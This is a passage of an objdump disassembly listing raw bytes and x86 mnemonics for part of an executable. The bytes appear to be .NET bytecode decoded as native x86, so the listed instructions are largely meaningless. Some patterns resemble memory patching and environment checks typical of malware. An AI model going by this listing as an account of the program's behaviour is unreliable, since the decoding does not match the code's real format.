  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	0a 28                	or     (%eax),%ch
  4025f0:	48                   	dec    %eax
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	0a 2c 05 16 13 04 de 	or     -0x21fbecea(,%eax,1),%ch
  4025fa:	12 07                	adc    (%edi),%al
  4025fc:	28 13                	sub    %dl,(%ebx)
  4025fe:	00 00                	add    %al,(%eax)
  402600:	06                   	push   %es
  402601:	26 17                	es pop %ss
  402603:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402606:	06                   	push   %es
  402607:	26 16                	es push %ss
  402609:	13 04 de             	adc    (%esi,%ebx,8),%eax
  40260c:	00 11                	add    %dl,(%ecx)
  40260e:	04 2a                	add    $0x2a,%al
  402610:	01 10                	add    %edx,(%eax)
  402612:	00 00                	add    %al,(%eax)
  402614:	00 00                	add    %al,(%eax)
  402616:	00 00                	add    %al,(%eax)
  402618:	af                   	scas   %es:(%edi),%eax
  402619:	af                   	scas   %es:(%edi),%eax
  40261a:	00 06                	add    %al,(%esi)
  40261c:	1a 00                	sbb    (%eax),%al
  40261e:	00 01                	add    %al,(%ecx)
  402620:	13 30                	adc    (%eax),%esi
  402622:	02 00                	add    (%eax),%al
  402624:	18 00                	sbb    %al,(%eax)
  402626:	00 00                	add    %al,(%eax)
  402628:	06                   	push   %es
  402629:	00 00                	add    %al,(%eax)
  40262b:	11 72 a4             	adc    %esi,-0x5c(%edx)
  40262e:	06                   	push   %es
  40262f:	00 70 28             	add    %dh,0x28(%eax)
  402632:	14 00                	adc    $0x0,%al
  402634:	00 06                	add    %al,(%esi)
  402636:	0a 72 f8             	or     -0x8(%edx),%dh
  402639:	06                   	push   %es
  40263a:	00 70 06             	add    %dh,0x6(%eax)
  40263d:	28 15 00 00 06 26    	sub    %dl,0x26060000
  402643:	2a 1e                	sub    (%esi),%bl
  402645:	02 28                	add    (%eax),%ch
  402647:	4a                   	dec    %edx
  402648:	00 00                	add    %al,(%eax)
  40264a:	0a 2a                	or     (%edx),%ch
  40264c:	1b 30                	sbb    (%eax),%esi
  40264e:	04 00                	add    $0x0,%al
  402650:	6d                   	insl   (%dx),%es:(%edi)
  402651:	00 00                	add    %al,(%eax)
  402653:	00 07                	add    %al,(%edi)
  402655:	00 00                	add    %al,(%eax)
  402657:	11 28                	adc    %ebp,(%eax)
  402659:	4b                   	dec    %ebx
  40265a:	00 00                	add    %al,(%eax)
  40265c:	0a 72 12             	or     0x12(%edx),%dh
  40265f:	07                   	pop    %es
  402660:	00 70 28             	add    %dh,0x28(%eax)
  402663:	2b 00                	sub    (%eax),%eax
  402665:	00 0a                	add    %cl,(%edx)
  402667:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  40266b:	0a 0a                	or     (%edx),%cl
  40266d:	72 12                	jb     0x402681
  40266f:	07                   	pop    %es
  402670:	00 70 28             	add    %dh,0x28(%eax)
  402673:	18 00                	sbb    %al,(%eax)
  402675:	00 06                	add    %al,(%esi)
  402677:	0b 07                	or     (%edi),%eax
  402679:	7e 47                	jle    0x4026c2
  40267b:	00 00                	add    %al,(%eax)
  40267d:	0a 28                	or     (%eax),%ch
  40267f:	48                   	dec    %eax
  402680:	00 00                	add    %al,(%eax)
  402682:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402685:	de 3d 07 20 00 10    	fidivrs 0x10002007
  40268b:	00 00                	add    %al,(%eax)
  40268d:	6a 28                	push   $0x28
  40268f:	21 00                	and    %eax,(%eax)
  402691:	00 0a                	add    %cl,(%edx)
  402693:	1f                   	pop    %ds
  402694:	40                   	inc    %eax
  402695:	12 02                	adc    (%edx),%al
  402697:	28 1a                	sub    %bl,(%edx)
  402699:	00 00                	add    %al,(%eax)
  40269b:	06                   	push   %es
  40269c:	26 06                	es push %es
  40269e:	16                   	push   %ss
  40269f:	07                   	pop    %es
  4026a0:	20 00                	and    %al,(%eax)
  4026a2:	10 00                	adc    %al,(%eax)
  4026a4:	00 28                	add    %ch,(%eax)
  4026a6:	23 00                	and    (%eax),%eax
  4026a8:	00 0a                	add    %cl,(%edx)
  4026aa:	07                   	pop    %es
  4026ab:	20 00                	and    %al,(%eax)
  4026ad:	10 00                	adc    %al,(%eax)
  4026af:	00 6a 28             	add    %ch,0x28(%edx)
  4026b2:	21 00                	and    %eax,(%eax)
  4026b4:	00 0a                	add    %cl,(%edx)
  4026b6:	08 12                	or     %dl,(%edx)
  4026b8:	02 28                	add    (%eax),%ch
  4026ba:	1a 00                	sbb    (%eax),%al
  4026bc:	00 06                	add    %al,(%esi)
  4026be:	26 de 03             	fiadds %es:(%ebx)
  4026c1:	26 de 00             	fiadds %es:(%eax)
  4026c4:	2a 00                	sub    (%eax),%al
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	01 10                	add    %edx,(%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	69 69 00 03 13 00 00 	imul   $0x1303,0x0(%ecx),%ebp
  4026d7:	01 13                	add    %edx,(%ebx)
  4026d9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4026dc:	56                   	push   %esi
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 01                	add    %al,(%ecx)
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	11 72 12             	adc    %esi,0x12(%edx)
  4026e6:	07                   	pop    %es
  4026e7:	00 70 28             	add    %dh,0x28(%eax)
  4026ea:	1d 00 00 06 72       	sbb    $0x72060000,%eax
  4026ef:	26 07                	es pop %es
  4026f1:	00 70 28             	add    %dh,0x28(%eax)
  4026f4:	1c 00                	sbb    $0x0,%al
  4026f6:	00 06                	add    %al,(%esi)
  4026f8:	0a 06                	or     (%esi),%al
  4026fa:	1c 6a                	sbb    $0x6a,%al
  4026fc:	28 21                	sub    %ah,(%ecx)
  4026fe:	00 00                	add    %al,(%eax)
  402700:	0a 1f                	or     (%edi),%bl
  402702:	40                   	inc    %eax
  402703:	12 01                	adc    (%ecx),%al
  402705:	28 1e                	sub    %bl,(%esi)
  402707:	00 00                	add    %al,(%eax)
  402709:	06                   	push   %es
  40270a:	26 19 8d 4b 00 00 01 	sbb    %ecx,%es:0x100004b(%ebp)
  402711:	25 d0 23 00 00       	and    $0x23d0,%eax
  402716:	04 28                	add    $0x28,%al
  402718:	22 00                	and    (%eax),%al
  40271a:	00 0a                	add    %cl,(%edx)
  40271c:	0c 08                	or     $0x8,%al
  40271e:	16                   	push   %ss
  40271f:	06                   	push   %es
  402720:	08 8e 69 28 23 00    	or     %cl,0x232869(%esi)
  402726:	00 0a                	add    %cl,(%edx)
  402728:	06                   	push   %es
  402729:	1c 6a                	sbb    $0x6a,%al
  40272b:	28 21                	sub    %ah,(%ecx)
  40272d:	00 00                	add    %al,(%eax)
  40272f:	0a 07                	or     (%edi),%al
  402731:	12 01                	adc    (%ecx),%al
  402733:	28 1e                	sub    %bl,(%esi)
  402735:	00 00                	add    %al,(%eax)
  402737:	06                   	push   %es
  402738:	26 2a 00             	sub    %es:(%eax),%al
  40273b:	00 1b                	add    %bl,(%ebx)
  40273d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402740:	f7 00 00 00 08 00    	testl  $0x80000,(%eax)
  402746:	00 11                	add    %dl,(%ecx)
  402748:	72 42                	jb     0x40278c
  40274a:	07                   	pop    %es
  40274b:	00 70 0a             	add    %dh,0xa(%eax)
  40274e:	72 4d                	jb     0x40279d
  402750:	08 00                	or     %al,(%eax)
  402752:	70 73                	jo     0x4027c7
  402754:	4d                   	dec    %ebp
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 25 6f 4e 00 00    	or     0x4e6f,%ah
  40275d:	0a 25 72 79 08 00    	or     0x87972,%ah
  402763:	70 73                	jo     0x4027d8
  402765:	4f                   	dec    %edi
  402766:	00 00                	add    %al,(%eax)
  402768:	0a 14 73             	or     (%ebx,%esi,2),%dl
  40276b:	50                   	push   %eax
  40276c:	00 00                	add    %al,(%eax)
  40276e:	0a 6f 51             	or     0x51(%edi),%ch
  402771:	00 00                	add    %al,(%eax)
  402773:	0a 0b                	or     (%ebx),%cl
  402775:	07                   	pop    %es
  402776:	72 95                	jb     0x40270d
  402778:	08 00                	or     %al,(%eax)
  40277a:	70 72                	jo     0x4027ee
  40277c:	9f                   	lahf
  40277d:	08 00                	or     %al,(%eax)
  40277f:	70 6f                	jo     0x4027f0
  402781:	52                   	push   %edx
  402782:	00 00                	add    %al,(%eax)
  402784:	0a 07                	or     (%edi),%al
  402786:	72 b9                	jb     0x402741
  402788:	08 00                	or     %al,(%eax)
  40278a:	70 06                	jo     0x402792
  40278c:	6f                   	outsl  %ds:(%esi),(%dx)
  40278d:	52                   	push   %edx
  40278e:	00 00                	add    %al,(%eax)
  402790:	0a 07                	or     (%edi),%al
  402792:	72 c5                	jb     0x402759
  402794:	08 00                	or     %al,(%eax)
  402796:	70 72                	jo     0x40280a
  402798:	e1 08                	loope  0x4027a2
  40279a:	00 70 6f             	add    %dh,0x6f(%eax)
  40279d:	52                   	push   %edx
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	0a 07                	or     (%edi),%al
  4027a2:	72 e9                	jb     0x40278d
  4027a4:	08 00                	or     %al,(%eax)
  4027a6:	70 72                	jo     0x40281a
  4027a8:	07                   	pop    %es
  4027a9:	09 00                	or     %eax,(%eax)
  4027ab:	70 6f                	jo     0x40281c
  4027ad:	52                   	push   %edx
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	0a 07                	or     (%edi),%al
  4027b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b3:	53                   	push   %ebx
  4027b4:	00 00                	add    %al,(%eax)
  4027b6:	0a 26                	or     (%esi),%ah
  4027b8:	25 72 1d 09 00       	and    $0x91d72,%eax
  4027bd:	70 73                	jo     0x402832
  4027bf:	4f                   	dec    %edi
  4027c0:	00 00                	add    %al,(%eax)
  4027c2:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4027c5:	50                   	push   %eax
  4027c6:	00 00                	add    %al,(%eax)
  4027c8:	0a 6f 51             	or     0x51(%edi),%ch
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4027d0:	72 95                	jb     0x402767
  4027d2:	08 00                	or     %al,(%eax)
  4027d4:	70 72                	jo     0x402848
  4027d6:	4f                   	dec    %edi
  4027d7:	09 00                	or     %eax,(%eax)
  4027d9:	70 6f                	jo     0x40284a
  4027db:	52                   	push   %edx
  4027dc:	00 00                	add    %al,(%eax)
  4027de:	0a 08                	or     (%eax),%cl
  4027e0:	72 6d                	jb     0x40284f
  4027e2:	09 00                	or     %eax,(%eax)
  4027e4:	70 02                	jo     0x4027e8
  4027e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e7:	52                   	push   %edx
  4027e8:	00 00                	add    %al,(%eax)
  4027ea:	0a 08                	or     (%eax),%cl
  4027ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ed:	53                   	push   %ebx
  4027ee:	00 00                	add    %al,(%eax)
  4027f0:	0a 26                	or     (%esi),%ah
  4027f2:	72 95                	jb     0x402789
  4027f4:	09 00                	or     %eax,(%eax)
  4027f6:	70 73                	jo     0x40286b
  4027f8:	4f                   	dec    %edi
  4027f9:	00 00                	add    %al,(%eax)
  4027fb:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4027fe:	50                   	push   %eax
  4027ff:	00 00                	add    %al,(%eax)
  402801:	0a 6f 51             	or     0x51(%edi),%ch
  402804:	00 00                	add    %al,(%eax)
  402806:	0a 25 72 c9 09 00    	or     0x9c972,%ah
  40280c:	70 07                	jo     0x402815
  40280e:	6f                   	outsl  %ds:(%esi),(%dx)
  40280f:	54                   	push   %esp
  402810:	00 00                	add    %al,(%eax)
  402812:	0a 6f 55             	or     0x55(%edi),%ch
  402815:	00 00                	add    %al,(%eax)
  402817:	0a 6f 52             	or     0x52(%edi),%ch
  40281a:	00 00                	add    %al,(%eax)
  40281c:	0a 25 72 d7 09 00    	or     0x9d772,%ah
  402822:	70 08                	jo     0x40282c
  402824:	6f                   	outsl  %ds:(%esi),(%dx)
  402825:	54                   	push   %esp
  402826:	00 00                	add    %al,(%eax)
  402828:	0a 6f 55             	or     0x55(%edi),%ch
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 6f 52             	or     0x52(%edi),%ch
  402830:	00 00                	add    %al,(%eax)
  402832:	0a 6f 53             	or     0x53(%edi),%ch
  402835:	00 00                	add    %al,(%eax)
  402837:	0a 26                	or     (%esi),%ah
  402839:	de 03                	fiadds (%ebx)
  40283b:	26 de 00             	fiadds %es:(%eax)
  40283e:	2a 00                	sub    (%eax),%al
  402840:	01 10                	add    %edx,(%eax)
  402842:	00 00                	add    %al,(%eax)
  402844:	00 00                	add    %al,(%eax)
  402846:	00 00                	add    %al,(%eax)
  402848:	f3 f3 00 03          	repz repz add %al,(%ebx)
  40284c:	1a 00                	sbb    (%eax),%al
  40284e:	00 01                	add    %al,(%ecx)
  402850:	1b 30                	sbb    (%eax),%esi
  402852:	03 00                	add    (%eax),%eax
  402854:	15 00 00 00 09       	adc    $0x9000000,%eax
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 17                	adc    %edx,(%edi)
  40285d:	16                   	push   %ss
  40285e:	16                   	push   %ss
  40285f:	28 21                	sub    %ah,(%ecx)
  402861:	00 00                	add    %al,(%eax)
  402863:	06                   	push   %es
  402864:	16                   	push   %ss
  402865:	fe 01                	incb   (%ecx)
  402867:	0a de                	or     %dh,%bl
  402869:	05 26 16 0a de       	add    $0xde0a1626,%eax
  40286e:	00 06                	add    %al,(%esi)
  402870:	2a 00                	sub    (%eax),%al
  402872:	00 00                	add    %al,(%eax)
  402874:	01 10                	add    %edx,(%eax)
  402876:	00 00                	add    %al,(%eax)
  402878:	00 00                	add    %al,(%eax)
  40287a:	00 00                	add    %al,(%eax)
  40287c:	0e                   	push   %cs
  40287d:	0e                   	push   %cs
  40287e:	00 05 13 00 00 01    	add    %al,0x1000013
  402884:	1b 30                	sbb    (%eax),%esi
  402886:	03 00                	add    (%eax),%eax
  402888:	15 00 00 00 09       	adc    $0x9000000,%eax
  40288d:	00 00                	add    %al,(%eax)
  40288f:	11 16                	adc    %edx,(%esi)
  402891:	16                   	push   %ss
  402892:	16                   	push   %ss
  402893:	28 21                	sub    %ah,(%ecx)
  402895:	00 00                	add    %al,(%eax)
  402897:	06                   	push   %es
  402898:	16                   	push   %ss
  402899:	fe 01                	incb   (%ecx)
  40289b:	0a de                	or     %dh,%bl
  40289d:	05 26 16 0a de       	add    $0xde0a1626,%eax
  4028a2:	00 06                	add    %al,(%esi)
  4028a4:	2a 00                	sub    (%eax),%al
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	01 10                	add    %edx,(%eax)
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	00 00                	add    %al,(%eax)
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	0e                   	push   %cs
  4028b1:	0e                   	push   %cs
  4028b2:	00 05 13 00 00 01    	add    %al,0x1000013
  4028b8:	1b 30                	sbb    (%eax),%esi
  4028ba:	03 00                	add    (%eax),%eax
  4028bc:	4b                   	dec    %ebx
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	00 00                	add    %al,(%eax)
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	00 73 56             	add    %dh,0x56(%ebx)
  4028c6:	00 00                	add    %al,(%eax)
  4028c8:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  4028ce:	7e 08                	jle    0x4028d8
  4028d0:	00 00                	add    %al,(%eax)
  4028d2:	04 6f                	add    $0x6f,%al
  4028d4:	57                   	push   %edi
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	0a 72 e9             	or     -0x17(%edx),%dh
  4028da:	09 00                	or     %eax,(%eax)
  4028dc:	70 6f                	jo     0x40294d
  4028de:	58                   	pop    %eax
  4028df:	00 00                	add    %al,(%eax)
  4028e1:	0a 7e 08             	or     0x8(%esi),%bh
  4028e4:	00 00                	add    %al,(%eax)
  4028e6:	04 6f                	add    $0x6f,%al
  4028e8:	59                   	pop    %ecx
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4028ee:	06                   	push   %es
  4028ef:	25 00 00 06 73       	and    $0x73060000,%eax
  4028f4:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  4028f9:	36 00 00             	add    %al,%ss:(%eax)
  4028fc:	0a 25 17 6f 37 00    	or     0x376f17,%ah
  402902:	00 0a                	add    %cl,(%edx)
  402904:	6f                   	outsl  %ds:(%esi),(%dx)
  402905:	38 00                	cmp    %al,(%eax)
  402907:	00 0a                	add    %cl,(%edx)
  402909:	de 03                	fiadds (%ebx)
  40290b:	26 de 00             	fiadds %es:(%eax)
  40290e:	2a 00                	sub    (%eax),%al
  402910:	01 10                	add    %edx,(%eax)
  402912:	00 00                	add    %al,(%eax)
  402914:	00 00                	add    %al,(%eax)
  402916:	00 00                	add    %al,(%eax)
  402918:	47                   	inc    %edi
  402919:	47                   	inc    %edi
  40291a:	00 03                	add    %al,(%ebx)
  40291c:	1a 00                	sbb    (%eax),%al
  40291e:	00 01                	add    %al,(%ecx)
  402920:	1b 30                	sbb    (%eax),%esi
  402922:	05 00 75 00 00       	add    $0x7500,%eax
  402927:	00 0a                	add    %cl,(%edx)
  402929:	00 00                	add    %al,(%eax)
  40292b:	11 00                	adc    %eax,(%eax)
  40292d:	7e 08                	jle    0x402937
  40292f:	00 00                	add    %al,(%eax)
  402931:	04 6f                	add    $0x6f,%al
  402933:	5a                   	pop    %edx
  402934:	00 00                	add    %al,(%eax)
  402936:	0a 25 6f 5b 00 00    	or     0x5b6f,%ah
  40293c:	0a 0a                	or     (%edx),%cl
  40293e:	6f                   	outsl  %ds:(%esi),(%dx)
  40293f:	5c                   	pop    %esp
  402940:	00 00                	add    %al,(%eax)
  402942:	0a 06                	or     (%esi),%al
  402944:	6f                   	outsl  %ds:(%esi),(%dx)
  402945:	5d                   	pop    %ebp
  402946:	00 00                	add    %al,(%eax)
  402948:	0a 72 07             	or     0x7(%edx),%dh
  40294b:	0a 00                	or     (%eax),%al
  40294d:	70 6f                	jo     0x4029be
  40294f:	5e                   	pop    %esi
  402950:	00 00                	add    %al,(%eax)
  402952:	0a 0b                	or     (%ebx),%cl
  402954:	07                   	pop    %es
  402955:	28 5f 00             	sub    %bl,0x0(%edi)
  402958:	00 0a                	add    %cl,(%edx)
  40295a:	2d 09 07 28 26       	sub    $0x26280709,%eax
  40295f:	00 00                	add    %al,(%eax)
  402961:	06                   	push   %es
  402962:	0c 2b                	or     $0x2b,%al
  402964:	06                   	push   %es
  402965:	72 0f                	jb     0x402976
  402967:	0a 00                	or     (%eax),%al
  402969:	70 0c                	jo     0x402977
  40296b:	28 60 00             	sub    %ah,0x0(%eax)
  40296e:	00 0a                	add    %cl,(%edx)
  402970:	08 6f 61             	or     %ch,0x61(%edi)
  402973:	00 00                	add    %al,(%eax)
  402975:	0a 0d 25 72 43 0a    	or     0xa437225,%cl
  40297b:	00 70 6f             	add    %dh,0x6f(%eax)
  40297e:	62 00                	bound  %eax,(%eax)
  402980:	00 0a                	add    %cl,(%edx)
  402982:	25 6f 63 00 00       	and    $0x636f,%eax
  402987:	0a 09                	or     (%ecx),%cl
  402989:	16                   	push   %ss
  40298a:	09 8e 69 6f 64 00    	or     %ecx,0x646f69(%esi)
  402990:	00 0a                	add    %cl,(%edx)
  402992:	6f                   	outsl  %ds:(%esi),(%dx)
  402993:	63 00                	arpl   %eax,(%eax)
  402995:	00 0a                	add    %cl,(%edx)
  402997:	6f                   	outsl  %ds:(%esi),(%dx)
  402998:	65 00 00             	add    %al,%gs:(%eax)
  40299b:	0a de                	or     %dh,%bl
  40299d:	8e 26                	mov    (%esi),%fs
  40299f:	de 8b 00 00 00 01    	fimuls 0x1000000(%ebx)
  4029a5:	10 00                	adc    %al,(%eax)
  4029a7:	00 00                	add    %al,(%eax)
  4029a9:	00 01                	add    %al,(%ecx)
  4029ab:	00 71 72             	add    %dh,0x72(%ecx)
  4029ae:	00 03                	add    %al,(%ebx)
  4029b0:	13 00                	adc    (%eax),%eax
  4029b2:	00 01                	add    %al,(%ecx)
  4029b4:	1b 30                	sbb    (%eax),%esi
  4029b6:	04 00                	add    $0x0,%al
  4029b8:	81 00 00 00 0b 00    	addl   $0xb0000,(%eax)
  4029be:	00 11                	add    %dl,(%ecx)
  4029c0:	73 66                	jae    0x402a28
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	0a 25 6f 67 00 00    	or     0x676f,%ah
  4029ca:	0a 72 20             	or     0x20(%edx),%dh
  4029cd:	02 00                	add    (%eax),%al
  4029cf:	70 6f                	jo     0x402a40
  4029d1:	1c 00                	sbb    $0x0,%al
  4029d3:	00 0a                	add    %cl,(%edx)
  4029d5:	25 6f 67 00 00       	and    $0x676f,%eax
  4029da:	0a 72 59             	or     0x59(%edx),%dh
  4029dd:	0a 00                	or     (%eax),%al
  4029df:	70 02                	jo     0x4029e3
  4029e1:	28 68 00             	sub    %ch,0x0(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e7:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4029ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ed:	67 00 00             	add    %al,(%bx,%si)
  4029f0:	0a 16                	or     (%esi),%dl
  4029f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f3:	1f                   	pop    %ds
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	0a 25 6f 67 00 00    	or     0x676f,%ah
  4029fc:	0a 17                	or     (%edi),%dl
  4029fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ff:	69 00 00 0a 25 6f    	imul   $0x6f250a00,(%eax),%eax
  402a05:	67 00 00             	add    %al,(%bx,%si)
  402a08:	0a 17                	or     (%edi),%dl
  402a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0b:	1e                   	push   %ds
  402a0c:	00 00                	add    %al,(%eax)
  402a0e:	0a 25 6f 6a 00 00    	or     0x6a6f,%ah
  402a14:	0a 26                	or     (%esi),%ah
  402a16:	25 6f 6b 00 00       	and    $0x6b6f,%eax
  402a1b:	0a 6f 6c             	or     0x6c(%edi),%ch
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	0a 0a                	or     (%edx),%cl
  402a22:	6f                   	outsl  %ds:(%esi),(%dx)
  402a23:	6d                   	insl   (%dx),%es:(%edi)
  402a24:	00 00                	add    %al,(%eax)
  402a26:	0a 06                	or     (%esi),%al
  402a28:	0b de                	or     %esi,%ebx
  402a2a:	14 0c                	adc    $0xc,%al
  402a2c:	72 61                	jb     0x402a8f
  402a2e:	0a 00                	or     (%eax),%al
  402a30:	70 08                	jo     0x402a3a
  402a32:	6f                   	outsl  %ds:(%esi),(%dx)
  402a33:	6e                   	outsb  %ds:(%esi),(%dx)
  402a34:	00 00                	add    %al,(%eax)
  402a36:	0a 28                	or     (%eax),%ch
  402a38:	68 00 00 0a 0b       	push   $0xb0a0000
  402a3d:	de 00                	fiadds (%eax)
  402a3f:	07                   	pop    %es
  402a40:	2a 00                	sub    (%eax),%al
  402a42:	00 00                	add    %al,(%eax)
  402a44:	01 10                	add    %edx,(%eax)
  402a46:	00 00                	add    %al,(%eax)
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	00 00                	add    %al,(%eax)
  402a4c:	6b 6b 00 14          	imul   $0x14,0x0(%ebx),%ebp
  402a50:	1a 00                	sbb    (%eax),%al
  402a52:	00 01                	add    %al,(%ecx)
  402a54:	1b 30                	sbb    (%eax),%esi
  402a56:	05 00 9f 00 00       	add    $0x9f00,%eax
  402a5b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a5e:	00 11                	add    %dl,(%ecx)
  402a60:	28 31                	sub    %dh,(%ecx)
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 6f 32             	or     0x32(%edi),%ch
  402a67:	00 00                	add    %al,(%eax)
  402a69:	0a 6f 33             	or     0x33(%edi),%ch
  402a6c:	00 00                	add    %al,(%eax)
  402a6e:	0a 0a                	or     (%edx),%cl
  402a70:	72 95                	jb     0x402a07
  402a72:	0a 00                	or     (%eax),%al
  402a74:	70 0b                	jo     0x402a81
  402a76:	7e 26                	jle    0x402a9e
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	0a 07                	or     (%edi),%al
  402a7c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a7d:	18 00                	sbb    %al,(%eax)
  402a7f:	00 0a                	add    %cl,(%edx)
  402a81:	0c 08                	or     $0x8,%al
  402a83:	72 a2                	jb     0x402a27
  402a85:	06                   	push   %es
  402a86:	00 70 72             	add    %dh,0x72(%eax)
  402a89:	96                   	xchg   %eax,%esi
  402a8a:	06                   	push   %es
  402a8b:	00 70 06             	add    %dh,0x6(%eax)
  402a8e:	72 96                	jb     0x402a26
  402a90:	06                   	push   %es
  402a91:	00 70 28             	add    %dh,0x28(%eax)
  402a94:	34 00                	xor    $0x0,%al
  402a96:	00 0a                	add    %cl,(%edx)
  402a98:	6f                   	outsl  %ds:(%esi),(%dx)
  402a99:	6f                   	outsl  %ds:(%esi),(%dx)
  402a9a:	00 00                	add    %al,(%eax)
  402a9c:	0a 08                	or     (%eax),%cl
  402a9e:	72 f5                	jb     0x402a95
  402aa0:	0a 00                	or     (%eax),%al
  402aa2:	70 72                	jo     0x402b16
  402aa4:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	0a de                	or     %dh,%bl
  402aae:	0a 08                	or     (%eax),%cl
  402ab0:	2c 06                	sub    $0x6,%al
  402ab2:	08 6f 70             	or     %ch,0x70(%edi)
  402ab5:	00 00                	add    %al,(%eax)
  402ab7:	0a dc                	or     %ah,%bl
  402ab9:	73 1b                	jae    0x402ad6
  402abb:	00 00                	add    %al,(%eax)
  402abd:	0a 25 72 15 0b 00    	or     0xb1572,%ah
  402ac3:	70 6f                	jo     0x402b34
  402ac5:	1c 00                	sbb    $0x0,%al
  402ac7:	00 0a                	add    %cl,(%edx)
  402ac9:	25 17 6f 1f 00       	and    $0x1f6f17,%eax
  402ace:	00 0a                	add    %cl,(%edx)
  402ad0:	25 17 6f 1e 00       	and    $0x1e6f17,%eax
  402ad5:	00 0a                	add    %cl,(%edx)
  402ad7:	25 17 6f 71 00       	and    $0x716f17,%eax
  402adc:	00 0a                	add    %cl,(%edx)
  402ade:	28 20                	sub    %ah,(%eax)
  402ae0:	00 00                	add    %al,(%eax)
  402ae2:	0a 26                	or     (%esi),%ah
  402ae4:	20 d0                	and    %dl,%al
  402ae6:	07                   	pop    %es
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	28 3a                	sub    %bh,(%edx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	0a 7e 26             	or     0x26(%esi),%bh
  402af0:	00 00                	add    %al,(%eax)
  402af2:	0a 07                	or     (%edi),%al
  402af4:	6f                   	outsl  %ds:(%esi),(%dx)
  402af5:	72 00                	jb     0x402af7
  402af7:	00 0a                	add    %cl,(%edx)
  402af9:	de 03                	fiadds (%ebx)
  402afb:	26 de 00             	fiadds %es:(%eax)
  402afe:	2a 00                	sub    (%eax),%al
  402b00:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402b03:	00 02                	add    %al,(%edx)
  402b05:	00 22                	add    %ah,(%edx)
  402b07:	00 2d 4f 00 0a 00    	add    %ch,0xa004f
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	00 00                	add    %al,(%eax)
  402b11:	00 00                	add    %al,(%eax)
  402b13:	00 9b 9b 00 03 13    	add    %bl,0x1303009b(%ebx)
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	01 13                	add    %edx,(%ebx)
  402b1d:	30 01                	xor    %al,(%ecx)
  402b1f:	00 53 00             	add    %dl,0x0(%ebx)
  402b22:	00 00                	add    %al,(%eax)
  402b24:	00 00                	add    %al,(%eax)
  402b26:	00 00                	add    %al,(%eax)
  402b28:	28 29                	sub    %ch,(%ecx)
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	06                   	push   %es
  402b2d:	2c 02                	sub    $0x2,%al
  402b2f:	17                   	pop    %ss
  402b30:	2a 28                	sub    (%eax),%ch
  402b32:	2a 00                	sub    (%eax),%al
  402b34:	00 06                	add    %al,(%esi)
  402b36:	2c 02                	sub    $0x2,%al
  402b38:	17                   	pop    %ss
  402b39:	2a 28                	sub    (%eax),%ch
  402b3b:	2b 00                	sub    (%eax),%eax
  402b3d:	00 06                	add    %al,(%esi)
  402b3f:	2c 02                	sub    $0x2,%al
  402b41:	17                   	pop    %ss
  402b42:	2a 28                	sub    (%eax),%ch
  402b44:	2c 00                	sub    $0x0,%al
  402b46:	00 06                	add    %al,(%esi)
  402b48:	2c 02                	sub    $0x2,%al
  402b4a:	17                   	pop    %ss
  402b4b:	2a 28                	sub    (%eax),%ch
  402b4d:	2d 00 00 06 2c       	sub    $0x2c060000,%eax
  402b52:	02 17                	add    (%edi),%dl
  402b54:	2a 28                	sub    (%eax),%ch
  402b56:	2e 00 00             	add    %al,%cs:(%eax)
  402b59:	06                   	push   %es
  402b5a:	2c 02                	sub    $0x2,%al
  402b5c:	17                   	pop    %ss
  402b5d:	2a 28                	sub    (%eax),%ch
  402b5f:	2f                   	das
  402b60:	00 00                	add    %al,(%eax)
  402b62:	06                   	push   %es
  402b63:	2c 02                	sub    $0x2,%al
